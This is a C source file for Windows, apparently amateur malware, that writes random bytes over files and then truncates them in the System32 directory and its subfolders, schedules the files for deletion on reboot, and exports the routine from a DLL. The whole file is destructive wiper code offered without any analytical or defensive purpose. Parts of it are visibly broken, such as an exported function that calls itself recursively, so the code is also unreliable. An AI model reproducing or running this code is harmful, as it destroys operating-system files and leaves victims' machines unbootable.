//i dont really know if this works OwO

#define _CRT_SECURE_NO_WARNINGS   
#define WIN32_LEAN_AND_MEAN  
#include <windows.h>  
#include <wincrypt.h>


static BOOL FileExists(const wchar_t* wszPath) {
    WIN32_FILE_ATTRIBUTE_DATA fad;
    return GetFileAttributesExW(wszPath, GetFileExInfoStandard, &fad);
}

static BOOL CombinePath(wchar_t* wszOut, size_t nSize,
    const wchar_t* wszLeft,
    const wchar_t* wszRight) {
    if (!wszOut || !wszLeft || !wszRight) return FALSE;
    wcscpy_s(wszOut, nSize, wszLeft);
    size_t len = wcslen(wszOut);
    if (len > 0 && wszOut[len - 1] != L'\\') {
        wszOut[len] = L'\\';
        wszOut[len + 1] = L'\0';
    }
    wcscat_s(wszOut, nSize, wszRight);
    return TRUE;
}


static DWORD CALLBACK KillFile(wchar_t* wszPath) {
    if (!wszPath || !FileExists(wszPath)) return ERROR_FILE_NOT_FOUND;

    HANDLE hFile = CreateFileW(
        wszPath,
        GENERIC_READ | GENERIC_WRITE | DELETE,
        0, NULL, OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_BACKUP_SEMANTICS,
        NULL
    );
    if (hFile == INVALID_HANDLE_VALUE) return GetLastError();

    HCRYPTPROV hProv = 0;
    BYTE rgb[4096];
    DWORD cbWritten = 0;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        CloseHandle(hFile); return GetLastError();
    }

    if (!CryptGenRandom(hProv, sizeof(rgb), rgb)) {
        CryptReleaseContext(hProv, 0);
        CloseHandle(hFile);
        return GetLastError();
    }

    CryptReleaseContext(hProv, 0);

    WriteFile(hFile, rgb, sizeof(rgb), &cbWritten, NULL);
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    SetEndOfFile(hFile);

    MoveFileExW(wszPath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
    CloseHandle(hFile);
    return ERROR_SUCCESS;
}


DWORD WINAPI CorruptSystem32(LPVOID lpThread) {
    UNREFERENCED_PARAMETER(lpThread);

    wchar_t wszSystem32[MAX_PATH];
    GetSystemDirectoryW(wszSystem32, MAX_PATH);

    wchar_t wszTarget[MAX_PATH];
    CombinePath(wszTarget, MAX_PATH, wszSystem32, L"..\\System32");

    WIN32_FIND_DATAW ffd;
    wchar_t wszSearch[MAX_PATH];
    CombinePath(wszSearch, MAX_PATH, wszTarget, L"*");

    HANDLE hFind = FindFirstFileW(wszSearch, &ffd);
    if (hFind == INVALID_HANDLE_VALUE) return GetLastError();

    do {
        if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (wcscmp(ffd.cFileName, L".") && wcscmp(ffd.cFileName, L"..")) {
                wchar_t wszSub[MAX_PATH];
                CombinePath(wszSub, MAX_PATH, wszTarget, ffd.cFileName);

                wchar_t wszSubSearch[MAX_PATH];
                CombinePath(wszSubSearch, MAX_PATH, wszSub, L"*");

                HANDLE hSub = FindFirstFileW(wszSubSearch, &ffd);
                if (hSub != INVALID_HANDLE_VALUE) {
                    do {
                        if (!(ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                            wchar_t wszFile[MAX_PATH];
                            CombinePath(wszFile, MAX_PATH, wszSub, ffd.cFileName);
                            KillFile(wszFile);
                        }
                    } while (FindNextFileW(hSub, &ffd));
                    FindClose(hSub);
                }
            }
        }
        else {
            wchar_t wszFile[MAX_PATH];
            CombinePath(wszFile, MAX_PATH, wszTarget, ffd.cFileName);
            KillFile(wszFile);
        }
    } while (FindNextFileW(hFind, &ffd));

    FindClose(hFind);
    return ERROR_SUCCESS;
}

__declspec(dllexport)
DWORD WINAPI CorruptS32(LPVOID lpParameter) {
    return CorruptS32(lpParameter);
}